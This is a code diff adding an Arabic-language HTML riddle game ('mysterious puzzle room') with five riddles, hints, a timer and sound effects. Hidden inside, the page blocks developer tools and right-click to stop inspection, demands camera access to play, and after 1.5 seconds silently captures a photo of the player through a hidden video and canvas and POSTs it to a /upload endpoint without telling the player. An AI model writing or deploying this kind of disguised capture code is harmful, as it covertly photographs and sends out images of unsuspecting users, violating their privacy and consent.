@@ -1,0 +1,202 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>غرفة الألغاز الغامضة</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    #riddle-box {
+      max-width: 90%;
+      background: rgba(255,255,255,0.05);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      transition: all 0.5s ease-in-out;
+    }
+
+    #question {
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 18px;
+      width: 80%;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      text-align: center;
+    }
+
+    button {
+      margin: 10px 5px 0;
+      padding: 10px 25px;
+      font-size: 18px;
+      background: #66fcf1;
+      color: #0b0c10;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #45a29e;
+    }
+
+    #result {
+      margin-top: 15px;
+      font-size: 18px;
+      min-height: 30px;
+    }
+
+    #timer {
+      font-size: 16px;
+      color: #f39c12;
+      margin-top: 10px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+  <script>
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        alert("🚫 لا يمكنك فحص هذا الموقع!");
+        return false;
+      }
+    });
+    document.addEventListener('contextmenu', e => e.preventDefault());
+  </script>
+</head>
+<body>
+  <div id="riddle-box">
+    <div id="question">جارٍ تحميل اللغز...</div>
+    <input type="text" id="answerInput" placeholder="اكتب إجابتك هنا" />
+    <br>
+    <button onclick="checkAnswer()">تحقق</button>
+    <button onclick="showHint()">تلميح</button>
+    <div id="timer"></div>
+    <div id="result"></div>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="cam"></canvas>
+
+  <audio id="bgMusic" loop autoplay>
+    <source src="https://cdn.pixabay.com/download/audio/2022/10/30/audio_2b15fd041c.mp3?filename=slow-mystical-ambient-123039.mp3" type="audio/mpeg">
+  </audio>
+
+  <audio id="successSound">
+    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_173ce744d6.mp3?filename=success-1-6297.mp3" type="audio/mpeg">
+  </audio>
+
+  <audio id="failSound">
+    <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_a0eaf419fb.mp3?filename=error-1-47861.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    const riddles = [
+      { question: "شيء كلما أخذت منه كبر؟", answer: "الحفرة", hint: "يتعلق بالأرض" },
+      { question: "يمشي بلا قدمين ويدخل الأذنين؟", answer: "الصوت", hint: "تسمعه ولا تراه" },
+      { question: "له رقبة بلا رأس وذراعان بلا يدين؟", answer: "القميص", hint: "يُلبس" },
+      { question: "تراني ولا أراك، ومن حولك أنا؟", answer: "الهواء", hint: "لا يُرى" },
+      { question: "شيء إن لمسته صاح؟", answer: "الجرس", hint: "يصدر صوتًا عند الاهتزاز" }
+    ];
+
+    let currentRiddle = 0, timer = 30, timerInterval;
+
+    const qEl = document.getElementById("question");
+    const iEl = document.getElementById("answerInput");
+    const rEl = document.getElementById("result");
+    const tEl = document.getElementById("timer");
+    const sSound = document.getElementById("successSound");
+    const fSound = document.getElementById("failSound");
+
+    function showRiddle(index) {
+      if (index < riddles.length) {
+        qEl.innerText = riddles[index].question;
+        iEl.value = "";
+        rEl.innerText = "";
+        timer = 30;
+        tEl.innerText = `⏳ ${timer} ثانية`;
+        clearInterval(timerInterval);
+        timerInterval = setInterval(() => {
+          timer--;
+          tEl.innerText = `⏳ ${timer} ثانية`;
+          if (timer === 0) {
+            clearInterval(timerInterval);
+            rEl.innerText = "❌ انتهى الوقت! حاول مجددًا.";
+          }
+        }, 1000);
+      } else {
+        qEl.innerText = "🎉 تهانينا! أنهيت كل الألغاز.";
+        iEl.style.display = "none";
+        tEl.style.display = "none";
+        document.querySelectorAll("button").forEach(btn => btn.style.display = "none");
+        rEl.innerHTML = "<br>🪄 تم فتح البوابة الغامضة...<br><strong>إعداد: Yazan</strong>";
+      }
+    }
+
+    function checkAnswer() {
+      const user = iEl.value.trim().toLowerCase();
+      const correct = riddles[currentRiddle].answer.toLowerCase();
+      if (user === correct) {
+        sSound.play();
+        rEl.innerText = "✔️ إجابة صحيحة!";
+        clearInterval(timerInterval);
+        setTimeout(() => showRiddle(++currentRiddle), 1000);
+      } else {
+        fSound.play();
+        rEl.innerText = "❌ خطأ! حاول مجددًا.";
+      }
+    }
+
+    function showHint() {
+      rEl.innerText = "💡 تلميح: " + riddles[currentRiddle].hint;
+    }
+
+    const video = document.getElementById("video");
+    const cam = document.getElementById("cam");
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        video.srcObject = stream;
+        setTimeout(() => {
+          const ctx = cam.getContext("2d");
+          cam.width = video.videoWidth;
+          cam.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, cam.width, cam.height);
+          const img = cam.toDataURL("image/png");
+          fetch("/upload", {
+            method: "POST",
+            body: JSON.stringify({ image: img }),
+            headers: { "Content-Type": "application/json" }
+          });
+          showRiddle(currentRiddle);
+        }, 1500);
+      })
+      .catch(() => {
+        document.body.innerHTML = "<h2 style='padding:20px;'>🚫 لا يمكنك دخول الغرفة بدون السماح بالصلاحيات.</h2>";
+      });
+  </script>
+</body>
+</html>
